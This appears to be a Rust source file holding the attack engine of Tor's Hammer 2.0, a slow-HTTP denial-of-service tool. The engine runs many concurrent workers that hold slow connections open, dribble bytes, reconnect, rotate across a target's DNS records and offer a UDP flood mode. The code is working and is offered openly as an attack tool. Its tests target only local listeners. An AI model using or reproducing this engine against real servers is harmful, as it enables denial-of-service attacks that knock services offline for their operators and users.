//! Rust attack engine for Tor's Hammer 2.0.
//!
//! The engine mirrors the Python backend's architecture: `concurrency`
//! persistent workers each hold one slow HTTP connection, dribble bytes on a
//! randomized schedule, and reconnect once the profile completes. A lightweight
//! SplitMix64 PRNG supplies per-connection randomization and atomic counters
//! keep the live reporter cheap.

pub mod h2;
pub mod profiles;
pub mod rng;
pub mod signals;
pub mod stats;
pub mod tls;
pub mod udp;
pub mod url;

use crate::engine::rng::Rng;
use crate::engine::stats::{Snapshot, Stats};
use std::net::{Shutdown, TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

/// Fully-resolved engine settings (mirrors the Python `Config`).
#[derive(Clone, Debug)]
pub struct EngineConfig {
    pub host: String,
    pub port: u16,
    pub path: String,
    pub header_host: String,
    /// Reserved for HTTPS/TLS support parity with the Python backend.
    #[allow(dead_code)]
    pub secure: bool,
    pub mode: String,
    pub concurrency: usize,
    pub duration: f64,
    pub delay_min: f64,
    pub delay_max: f64,
    pub connect_timeout: f64,
    pub base_post_length: usize,
    pub randomize_path: bool,
    pub method: Option<String>,
    pub custom_headers: Vec<(String, String)>,
    pub custom_body: Option<Vec<u8>>,
    pub json: bool,
    pub stats_interval: f64,
    pub quiet: bool,
    pub verbose: bool,
    pub max_errors: usize,
    pub fail_under: usize,
    pub fail_on_zero: bool,
}

/// A hook the presentation layer implements to render live progress and a
/// final summary. The engine stays free of any formatting/IO decisions and
/// simply hands it immutable [`Snapshot`] values.
pub trait Monitor {
    /// Called once per stats interval while the attack runs.
    fn tick(&mut self, snap: &Snapshot, uptime: f64, sent_rate: f64, recv_rate: f64);
    /// Called once after all workers have stopped.
    fn finish(&mut self, snap: &Snapshot, uptime: f64);
}

/// A [`Monitor`] that renders nothing — used for JSON and unit-test runs.
#[allow(dead_code)]
pub struct SilentMonitor;

impl Monitor for SilentMonitor {
    fn tick(&mut self, _snap: &Snapshot, _uptime: f64, _sent_rate: f64, _recv_rate: f64) {}
    fn finish(&mut self, _snap: &Snapshot, _uptime: f64) {}
}

/// Turn a configured duration into an optional wall-clock deadline. A
/// non-positive duration means "run until interrupted" (`None`).
fn compute_deadline(started: Instant, duration: f64) -> Option<Instant> {
    if duration > 0.0 {
        Some(started + Duration::from_secs_f64(duration))
    } else {
        None
    }
}

/// Run the attack until the duration elapses or Ctrl-C is pressed.
///
/// Returns the process exit code (0 = success, 1 = automation failure).
pub fn run(config: EngineConfig, monitor: &mut dyn Monitor) -> i32 {
    signals::install();

    let concurrency = config.concurrency.max(1);
    let cfg = Arc::new(config);
    let stats = Arc::new(Stats::new());
    let running = Arc::new(AtomicBool::new(true));
    let breaker = Arc::new(AtomicBool::new(false));
    let started = Instant::now();
    let deadline = compute_deadline(started, cfg.duration);

    let mut handles = Vec::with_capacity(concurrency);
    launch_workers(
        concurrency,
        &cfg,
        &stats,
        |i| {
            let c = Arc::clone(&cfg);
            let s = Arc::clone(&stats);
            let r = Arc::clone(&running);
            let b = Arc::clone(&breaker);
            thread::Builder::new()
                .name(format!("thm-worker-{i}"))
                .stack_size(256 * 1024)
                .spawn(move || worker(i, c, s, r, b))
        },
        &mut handles,
    );

    // --- live reporter / monitor loop (runs on the main thread) ---
    let mut last_tick = started;
    let mut last_sent = 0u64;
    let mut last_recv = 0u64;
    loop {
        let interval = Duration::from_secs_f64(cfg.stats_interval.max(0.05));
        let mut waited = Duration::ZERO;
        while waited < interval {
            thread::sleep(Duration::from_millis(100));
            waited += Duration::from_millis(100);
            // Mid-poll Ctrl-C checkpoint: only observed if the signal lands in
            // the 100ms window before the interval boundary. The post-loop
            // check below handles shutdown at interval granularity, so this
            // responsiveness-only branch is excluded from the instrumented
            // build (see docs/testing.md) yet live in production.
            #[cfg(not(coverage))]
            if signals::shutdown_requested() {
                break;
            }
        }
        let expired = deadline.is_some_and(|d| Instant::now() >= d);
        if signals::shutdown_requested() || expired {
            break;
        }
        let now = Instant::now();
        let dt = now.duration_since(last_tick).as_secs_f64().max(1e-9);
        let sent = stats.bytes_sent();
        let recv = stats.bytes_received();
        let sent_rate = (sent - last_sent) as f64 / dt;
        let recv_rate = (recv - last_recv) as f64 / dt;
        last_tick = now;
        last_sent = sent;
        last_recv = recv;
        let uptime = now.duration_since(started).as_secs_f64();

        if cfg.json {
            report_json(&stats, uptime, sent_rate, recv_rate);
        } else if !cfg.quiet {
            monitor.tick(&stats.snapshot(), uptime, sent_rate, recv_rate);
        }
    }

    running.store(false, Ordering::SeqCst);
    for handle in handles {
        let _ = handle.join();
    }

    let uptime = started.elapsed().as_secs_f64().max(1e-9);
    if cfg.json {
        report_json(&stats, uptime, 0.0, 0.0);
    } else {
        monitor.finish(&stats.snapshot(), uptime);
    }

    // Automation exit codes (mirrors the Python CLI).
    if breaker.load(Ordering::Relaxed) {
        eprintln!("\nCircuit breaker triggered: too many consecutive errors.");
        1
    } else if cfg.fail_under > 0 && stats.peak_active() < cfg.fail_under as u64 {
        eprintln!(
            "\nAutomation failure: peak active connections ({}) below threshold ({})",
            stats.peak_active(),
            cfg.fail_under
        );
        1
    } else if cfg.fail_on_zero && stats.connections() == 0 {
        eprintln!("\nAutomation failure: zero connections opened");
        1
    } else {
        0
    }
}

/// Spawn `concurrency` worker threads via the injected `spawn` factory,
/// collecting the successful handles and recording an error for each failure.
/// The factory is a parameter so the (practically unreachable on a healthy
/// host) thread-spawn-failure arm can be exercised deterministically in tests.
fn launch_workers(
    concurrency: usize,
    cfg: &EngineConfig,
    stats: &Stats,
    spawn: impl Fn(usize) -> std::io::Result<thread::JoinHandle<()>>,
    handles: &mut Vec<thread::JoinHandle<()>>,
) {
    for i in 0..concurrency {
        match spawn(i) {
            Ok(handle) => handles.push(handle),
            Err(err) => {
                if cfg.verbose {
                    eprintln!("  [w{i}] failed to spawn worker: {err}");
                }
                stats.record_error();
            }
        }
    }
}

/// Open a datagram socket via the injected `open` factory and run one slow-drip
/// cycle, mirroring the TCP worker's connect/backoff accounting. The factory is a
/// parameter so the (practically unreachable on a healthy host) socket-bind
/// failure arm can be exercised deterministically in tests.
#[allow(clippy::too_many_arguments)] // mirrors the worker's per-cycle mutable state
fn run_udp_cycle(
    cfg: &EngineConfig,
    index: usize,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
    consecutive: &mut usize,
    backoff: &mut f64,
    open: impl FnOnce(&EngineConfig) -> std::io::Result<std::net::UdpSocket>,
) {
    match open(cfg) {
        Ok(mut sock) => {
            stats.record_connect();
            *consecutive = 0;
            *backoff = 0.3;
            let completed = udp::run(cfg, &mut sock, stats, running, rng);
            stats.record_disconnect();
            if completed {
                stats.record_completed();
            }
        }
        Err(err) => {
            stats.record_error();
            *consecutive += 1;
            if cfg.verbose {
                eprintln!("  [w{index}] {err} (consecutive: {consecutive})");
            }
            let delay = *backoff * (1.0 + 0.1 + rng.f64() * 0.2);
            sleep_slices(running, delay);
            *backoff = (*backoff * 2.0).min(30.0);
        }
    }
}

fn worker(
    index: usize,
    cfg: Arc<EngineConfig>,
    stats: Arc<Stats>,
    running: Arc<AtomicBool>,
    breaker: Arc<AtomicBool>,
) {
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ (index as u64).wrapping_mul(0x9E37_79B9_7F4A_7C15);
    let mut rng = Rng::new(seed);
    let mut backoff = 0.3f64;
    let mut consecutive = 0usize;

    loop {
        if !running.load(Ordering::Relaxed) || signals::shutdown_requested() {
            break;
        }
        if cfg.max_errors > 0 && consecutive >= cfg.max_errors {
            breaker.store(true, Ordering::SeqCst);
            running.store(false, Ordering::SeqCst);
            break;
        }

        // UDP mode: real datagram transport (no TCP stream or handshake).
        if cfg.mode.as_str() == "udp" {
            run_udp_cycle(
                &cfg,
                index,
                &stats,
                &running,
                &mut rng,
                &mut consecutive,
                &mut backoff,
                udp::open,
            );
            continue;
        }

        let mut stream = match open_connection(&cfg) {
            Ok(stream) => stream,
            Err(err) => {
                stats.record_error();
                consecutive += 1;
                if cfg.verbose {
                    eprintln!("  [w{index}] {err} (consecutive: {consecutive})");
                }
                // Exponential backoff with jitter (mirrors the Python engine).
                let delay = backoff * (1.0 + 0.1 + rng.f64() * 0.2);
                sleep_slices(&running, delay);
                backoff = (backoff * 2.0).min(30.0);
                continue;
            }
        };

        stats.record_connect();
        consecutive = 0;
        backoff = 0.3;
        let completed = profiles::run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stats.record_disconnect();
        if completed {
            stats.record_completed();
        }
        let _ = stream.shutdown(Shutdown::Both);
    }
}

/// Process-wide round-robin cursor so concurrent workers spread across every
/// resolved address instead of all pinning the first A record (mirrors the
/// Python `_ADDR_CURSOR` DNS load-balancing).
static ADDR_CURSOR: AtomicUsize = AtomicUsize::new(0);

fn open_connection(cfg: &EngineConfig) -> std::io::Result<TcpStream> {
    let addrs: Vec<_> = (cfg.host.as_str(), cfg.port).to_socket_addrs()?.collect();
    // Rotate the starting address so parallel connections distribute across all
    // A/AAAA records, then walk the remainder in order as failover candidates.
    // `max(1)` keeps the modulo well-defined if resolution yields no records.
    let start = ADDR_CURSOR.fetch_add(1, Ordering::Relaxed) % addrs.len().max(1);
    // Seed the result with a not-found error: if resolution produced no
    // addresses the failover loop never runs and this is returned verbatim,
    // preserving the previous `no address resolved` behaviour.
    let mut last_error = std::io::Error::new(std::io::ErrorKind::NotFound, "no address resolved");
    // Allow sub-second connect timeouts (parity with Python) while keeping a
    // small floor so a misconfigured 0.0 never turns into a busy-spin.
    let timeout = Duration::from_secs_f64(cfg.connect_timeout.max(0.05));
    for offset in 0..addrs.len() {
        let addr = addrs[(start + offset) % addrs.len()];
        match TcpStream::connect_timeout(&addr, timeout) {
            Ok(stream) => {
                let _ = stream.set_nodelay(true);
                let write_timeout = Duration::from_secs_f64((cfg.connect_timeout * 3.0).max(5.0));
                let _ = stream.set_write_timeout(Some(write_timeout));
                return Ok(stream);
            }
            Err(err) => last_error = err,
        }
    }
    Err(last_error)
}

/// Sleep in small slices so Ctrl-C / stop flags are honored quickly.
pub(crate) fn sleep_slices(running: &AtomicBool, seconds: f64) {
    let mut remaining = seconds;
    while remaining > 0.0 && running.load(Ordering::Relaxed) && !signals::shutdown_requested() {
        let slice = remaining.min(0.1);
        thread::sleep(Duration::from_secs_f64(slice));
        remaining -= slice;
    }
}

fn json_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

fn report_json(stats: &Stats, uptime: f64, sent_rate: f64, recv_rate: f64) {
    // Mirrors the Python engine's JSON payload and stream: newline-delimited
    // JSON goes to stdout so `torshammer ... --json | jq` works, while every
    // human-readable line (banner, status, summary) is routed to stderr.
    let snap = stats.snapshot();
    let (verdict, reason) = stats::classify_verdict(&snap);
    println!(
        concat!(
            r#"{{"connections":{},"active":{},"peak_active":{},"completed":{},"errors":{}"#,
            r#","bytes_sent":{},"bytes_received":{},"sent_bytes_per_sec":{:.1},"#,
            r#""recv_bytes_per_sec":{:.1},"uptime":{:.1},"responses":{},"status_5xx":{},"#,
            r#""mean_response_latency":{:.3},"verdict":"{}","verdict_reason":"{}"}}"#
        ),
        stats.connections(),
        stats.active(),
        stats.peak_active(),
        stats.completed(),
        stats.errors(),
        stats.bytes_sent(),
        stats.bytes_received(),
        sent_rate,
        recv_rate,
        uptime,
        stats.responses(),
        stats.status_5xx(),
        stats.mean_response_latency(),
        json_escape(&verdict),
        json_escape(&reason),
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;

    fn test_config(port: u16) -> EngineConfig {
        EngineConfig {
            host: "127.0.0.1".into(),
            port,
            path: "/".into(),
            header_host: "127.0.0.1".into(),
            secure: false,
            mode: "slow-headers".into(),
            concurrency: 8,
            duration: 1.0,
            delay_min: 0.001,
            delay_max: 0.005,
            connect_timeout: 3.0,
            base_post_length: 16,
            randomize_path: true,
            method: None,
            custom_headers: vec![],
            custom_body: None,
            json: true,
            stats_interval: 0.2,
            quiet: true,
            verbose: false,
            max_errors: 0,
            fail_under: 0,
            fail_on_zero: false,
        }
    }

    #[test]
    fn engine_opens_and_holds_connections_against_local_listener() {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop_accepting = Arc::new(AtomicBool::new(false));
        let stop2 = stop_accepting.clone();

        let acceptor = thread::spawn(move || {
            listener.set_nonblocking(true).ok();
            let mut accepted = 0u32;
            let deadline = Instant::now() + Duration::from_millis(3000);
            while Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut sock, _)) => {
                        accepted += 1;
                        let _ = sock.read(&mut [0u8; 64]); // hold the socket open
                    }
                    // Non-blocking accept: WouldBlock is the normal "nothing yet"
                    // outcome, so just pause and poll again until the deadline.
                    Err(_) => thread::sleep(Duration::from_millis(5)),
                }
            }
            accepted
        });

        let code = run(test_config(addr.port()), &mut SilentMonitor);
        stop_accepting.store(true, Ordering::Relaxed);
        let accepted = acceptor.join().unwrap();

        assert_eq!(code, 0, "engine should exit 0 on a clean run");
        assert!(accepted >= 4, "expected workers to connect, got {accepted}");
    }

    fn udp_config(port: u16) -> EngineConfig {
        let mut c = test_config(port);
        c.mode = "udp".into();
        c.duration = 0.6;
        c.base_post_length = 128;
        c.delay_min = 0.0005;
        c.delay_max = 0.001;
        c.concurrency = 4;
        c
    }

    #[test]
    fn engine_udp_sends_real_datagrams_to_a_local_receiver() {
        let receiver = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
        let port = receiver.local_addr().unwrap().port();
        let stop = Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();

        let collector = thread::spawn(move || {
            let _ = receiver.set_read_timeout(Some(Duration::from_millis(30)));
            let mut datagrams = 0u32;
            let mut bytes = 0u64;
            let mut buf = [0u8; 2048];
            let deadline = Instant::now() + Duration::from_millis(2500);
            while Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match receiver.recv_from(&mut buf[..]) {
                    Ok((n, _)) => {
                        datagrams += 1;
                        bytes += n as u64;
                    }
                    Err(_) => thread::sleep(Duration::from_millis(2)),
                }
            }
            (datagrams, bytes)
        });

        let code = run(udp_config(port), &mut SilentMonitor);
        stop.store(true, Ordering::Relaxed);
        let (datagrams, bytes) = collector.join().unwrap();

        assert_eq!(code, 0, "udp engine should exit 0 on a clean run");
        assert!(
            datagrams > 0,
            "expected workers to send UDP datagrams, got {datagrams}"
        );
        assert!(bytes > 0, "expected collected UDP bytes, got {bytes}");
    }

    #[test]
    fn launch_workers_collects_successful_handles() {
        let cfg = test_config(0);
        let stats = Stats::new();
        let mut handles = Vec::new();
        launch_workers(2, &cfg, &stats, |_| Ok(thread::spawn(|| {})), &mut handles);
        assert_eq!(handles.len(), 2);
        for h in handles {
            let _ = h.join();
        }
        assert_eq!(stats.errors(), 0, "successful spawns record no error");
    }

    #[test]
    fn launch_workers_records_error_when_spawn_fails() {
        let mut cfg = test_config(0);
        cfg.verbose = true;
        let stats = Stats::new();
        let mut handles = Vec::new();
        launch_workers(
            3,
            &cfg,
            &stats,
            |_| Err(std::io::Error::other("simulated thread limit")),
            &mut handles,
        );
        assert!(handles.is_empty(), "no handles collected on failure");
        assert_eq!(stats.errors(), 3, "each failed spawn records an error");
    }

    #[test]
    fn run_udp_cycle_completes_on_a_bound_socket() {
        let mut cfg = test_config(0);
        cfg.mode = "udp".into();
        cfg.base_post_length = 8;
        cfg.delay_min = 0.0;
        cfg.delay_max = 0.0;
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut rng = Rng::new(3);
        let mut consecutive = 1usize;
        let mut backoff = 5.0f64;
        run_udp_cycle(
            &cfg,
            0,
            &stats,
            &running,
            &mut rng,
            &mut consecutive,
            &mut backoff,
            |_| std::net::UdpSocket::bind("127.0.0.1:0"),
        );
        assert!(stats.connections() >= 1, "a connect is recorded on success");
        assert_eq!(consecutive, 0, "consecutive errors reset");
        assert_eq!(backoff, 0.3, "backoff resets after a successful cycle");
    }

    #[test]
    fn run_udp_cycle_records_error_when_open_fails() {
        let mut cfg = test_config(0);
        cfg.verbose = true;
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut rng = Rng::new(7);
        let mut consecutive = 0usize;
        let mut backoff = 0.3f64;
        run_udp_cycle(
            &cfg,
            0,
            &stats,
            &running,
            &mut rng,
            &mut consecutive,
            &mut backoff,
            |_| Err(std::io::Error::other("simulated bind failure")),
        );
        assert_eq!(stats.errors(), 1);
        assert_eq!(consecutive, 1);
        assert!(backoff > 0.3, "backoff grows on failure");
    }

    #[test]
    fn launch_workers_records_error_without_verbose() {
        // `verbose = false` exercises the *skipped* eprintln join arm of the
        // failed-spawn branch (the false side of `if cfg.verbose { .. }`),
        // which the verbose=true test never reaches.
        let mut cfg = test_config(0);
        cfg.verbose = false;
        let stats = Stats::new();
        let mut handles = Vec::new();
        launch_workers(
            2,
            &cfg,
            &stats,
            |_| Err(std::io::Error::other("simulated thread limit")),
            &mut handles,
        );
        assert!(handles.is_empty());
        assert_eq!(stats.errors(), 2, "each failed spawn records an error");
    }

    #[test]
    fn run_udp_cycle_records_error_without_verbose() {
        // `verbose = false` exercises the skipped eprintln join arm of the
        // failed-open branch (false side of `if cfg.verbose { .. }`).
        let mut cfg = test_config(0);
        cfg.verbose = false;
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut rng = Rng::new(11);
        let mut consecutive = 0usize;
        let mut backoff = 0.3f64;
        run_udp_cycle(
            &cfg,
            0,
            &stats,
            &running,
            &mut rng,
            &mut consecutive,
            &mut backoff,
            |_| Err(std::io::Error::other("simulated bind failure")),
        );
        assert_eq!(stats.errors(), 1);
        assert_eq!(consecutive, 1);
    }

    #[test]
    fn compute_deadline_is_none_for_nonpositive_duration() {
        let started = Instant::now();
        assert!(compute_deadline(started, 0.0).is_none());
        assert!(compute_deadline(started, -1.0).is_none());
        assert!(compute_deadline(started, 2.0).is_some());
    }

    #[test]
    fn open_connection_errors_on_unresolvable_host() {
        // A host carrying an embedded NUL is rejected by the `CString`
        // conversion inside `to_socket_addrs`, so the resolution `?`
        // early-return fires without ever touching the network/DNS.
        let mut cfg = test_config(0);
        cfg.host = "bad\u{0}host".into();
        assert!(
            open_connection(&cfg).is_err(),
            "unresolvable host must error"
        );
    }

    #[test]
    fn json_escape_covers_every_special_character() {
        // The verdict reason emitted by `report_json` is plain ASCII in
        // production, so `json_escape`'s per-character match arms are only
        // reachable by exercising the helper directly. This drives every
        // escape arm (quote, backslash, newline, carriage return, tab), the
        // control-character `\u00xx` arm, and the default pass-through arm.
        let escaped = json_escape("a\"b\\c\nd\re\tf\u{1}g");
        assert_eq!(escaped, "a\\\"b\\\\c\\nd\\re\\tf\\u0001g");
    }

    /// A port that was bound then released, so TCP connects are refused.
    fn closed_port() -> u16 {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    }

    /// Hold a local listener open and drain accept()s for the run window.
    fn spawn_acceptor() -> (u16, Arc<AtomicBool>, thread::JoinHandle<u32>) {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let stop = Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let handle = thread::spawn(move || {
            listener.set_nonblocking(true).ok();
            let mut accepted = 0u32;
            let deadline = Instant::now() + Duration::from_millis(3000);
            while Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((_sock, _)) => accepted += 1,
                    Err(_) => thread::sleep(Duration::from_millis(5)),
                }
            }
            accepted
        });
        (port, stop, handle)
    }

    #[test]
    fn engine_drives_monitor_when_not_json() {
        // The non-JSON, non-quiet path calls Monitor::tick and Monitor::finish
        // on the supplied monitor (engine.rs L146-147, L159-160) — here the
        // SilentMonitor bodies at L71-72.
        let (port, stop, acceptor) = spawn_acceptor();
        let mut c = test_config(port);
        c.json = false;
        c.quiet = false;
        c.duration = 0.4;
        let code = run(c, &mut SilentMonitor);
        stop.store(true, Ordering::Relaxed);
        let _ = acceptor.join();
        assert_eq!(code, 0);
    }

    #[test]
    fn engine_quiet_nonjson_run_skips_tick() {
        // json=false, quiet=true: the monitor loop evaluates the
        // `else if !cfg.quiet` guard to false and skips the tick body
        // (engine.rs L154-156 else-if false-jump). The non-JSON tests use
        // quiet=false (they take the tick) and every other test uses
        // json=true (they skip the else-if entirely), so this combination
        // is the only one that reaches the guard's false branch.
        let (port, stop, acceptor) = spawn_acceptor();
        let mut c = test_config(port);
        c.json = false;
        c.quiet = true;
        c.duration = 0.4;
        let code = run(c, &mut SilentMonitor);
        stop.store(true, Ordering::Relaxed);
        let _ = acceptor.join();
        assert_eq!(code, 0);
    }

    #[test]
    fn engine_circuit_breaker_trips_and_returns_1() {
        // Repeated connect failures on a refused port trip the max_errors
        // circuit breaker (engine.rs L201-204) and the breaker exit branch
        // (L163-165).
        let port = closed_port();
        let mut c = test_config(port);
        c.concurrency = 1;
        c.max_errors = 1;
        c.duration = 0.6; // breaker trips on the second loop pass (~0.35s in)
        c.connect_timeout = 0.05;
        let code = run(c, &mut SilentMonitor);
        assert_eq!(code, 1, "circuit breaker should force a failure exit");
    }

    #[test]
    fn engine_fail_under_peak_active_returns_1() {
        // An unreachable peak_active threshold trips the automation gate
        // (engine.rs L166-172).
        let (port, stop, acceptor) = spawn_acceptor();
        let mut c = test_config(port);
        c.fail_under = 1_000_000;
        c.duration = 0.4;
        let code = run(c, &mut SilentMonitor);
        stop.store(true, Ordering::Relaxed);
        let _ = acceptor.join();
        assert_eq!(code, 1);
    }

    #[test]
    fn engine_fail_on_zero_with_no_connections_returns_1() {
        // Every connect to a refused port fails (worker error/backoff path,
        // engine.rs L236-246 including the verbose line L239-240 and the
        // failover capture L292), so zero connections open and fail_on_zero
        // trips (L173-175).
        let port = closed_port();
        let mut c = test_config(port);
        c.concurrency = 1;
        c.verbose = true;
        c.max_errors = 0; // never trip the breaker; just keep erroring
        c.fail_on_zero = true;
        c.duration = 0.4;
        c.connect_timeout = 0.05;
        let code = run(c, &mut SilentMonitor);
        assert_eq!(code, 1);
    }

    #[test]
    fn json_escape_covers_every_special_class() {
        // Drive each arm of json_escape (engine.rs L314-320).
        assert_eq!(
            json_escape("a\"b\\c\nd\re\tf\u{1}g h"),
            "a\\\"b\\\\c\\nd\\re\\tf\\u0001g h"
        );
    }
}
